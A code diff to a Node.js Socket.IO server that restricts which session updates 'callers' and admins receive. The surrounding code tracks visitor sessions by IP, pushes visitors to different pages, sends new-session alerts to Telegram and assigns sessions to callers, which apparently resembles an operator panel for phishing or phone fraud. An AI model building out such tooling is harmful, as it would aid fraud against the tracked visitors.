@@ -1462,7 +1462,7 @@ app.post('/verify-turnstile', async (req, res) => {
                 const newUrl = sessionManager.updateSessionPage(sessionId, loadingPageName);
                 
                 console.log('Reactivating existing session:', sessionId);
-                adminNamespace.emit('session_updated', existingVerifiedSession);
+                emitSessionUpdate('session_updated', existingVerifiedSession);
                 
                 return res.json({ 
                     success: true, 
@@ -1495,7 +1495,7 @@ app.post('/verify-turnstile', async (req, res) => {
                 console.log('Session verified and promoted, new URL:', newUrl);
                 
                 // Only now notify admin of new session since it's verified
-                adminNamespace.emit('session_created', session);
+                emitSessionUpdate('session_created', session);
                 await sendTelegramNotification(formatTelegramMessage('new_session', {
                     id: sessionId,
                     ip: session.clientIP,
@@ -1888,6 +1888,27 @@ const activeCallerSessions = new Map(); // Map of username to socket IDs
 // Admin namespace
 const adminNamespace = io.of('/admin');
 
+// Helper function to emit session updates to appropriate users
+function emitSessionUpdate(eventName, sessionOrId) {
+    // Get the session object if we only have an ID
+    const session = typeof sessionOrId === 'string'
+        ? sessionManager.getSession(sessionOrId)
+        : sessionOrId;
+
+    // Emit to all connected sockets in admin namespace
+    adminNamespace.sockets.forEach((socket) => {
+        if (socket.userRole === 'admin') {
+            // Admins see all sessions
+            socket.emit(eventName, sessionOrId);
+        } else if (socket.userRole === 'caller' && socket.username) {
+            // Callers only see their assigned sessions
+            if (session && session.assignedTo === socket.username) {
+                socket.emit(eventName, sessionOrId);
+            }
+        }
+    });
+}
+
 adminNamespace.use((socket, next) => {
     const token = socket.handshake.auth.token;
     const userRole = socket.handshake.auth.role;
@@ -1914,11 +1935,18 @@ adminNamespace.on('connection', (socket) => {
     }
 
     // Only get verified sessions using the session manager's method
-    const verifiedSessions = sessionManager.getAllVerifiedSessions();
+    let sessionsToSend;
+    if (socket.userRole === 'caller' && socket.username) {
+        // Callers only see their assigned sessions
+        sessionsToSend = sessionManager.getAssignedSessions(socket.username);
+    } else {
+        // Admins see all verified sessions
+        sessionsToSend = sessionManager.getAllVerifiedSessions();
+    }
 
     socket.emit('init', {
         settings: state.settings,
-        sessions: verifiedSessions,
+        sessions: sessionsToSend,
         bannedIPs: ipManager.getAllBannedIPs(),
         availablePages: state.settings.availablePages,
         callers: callerManager.getAllCallers(),
@@ -2047,7 +2075,8 @@ adminNamespace.on('connection', (socket) => {
             const success = sessionManager.assignSessionToCaller(sessionId, callerId);
             if (success) {
                 const session = sessionManager.getSession(sessionId);
-                adminNamespace.emit('session_updated', session);
+                // Use helper to ensure caller receives the newly assigned session
+                emitSessionUpdate('session_updated', session);
             }
         }
     });
@@ -2057,7 +2086,8 @@ adminNamespace.on('connection', (socket) => {
             const success = sessionManager.unassignSession(sessionId);
             if (success) {
                 const session = sessionManager.getSession(sessionId);
-                adminNamespace.emit('session_updated', session);
+                // Use helper to remove session from caller's view
+                emitSessionUpdate('session_updated', session);
             }
         }
     });
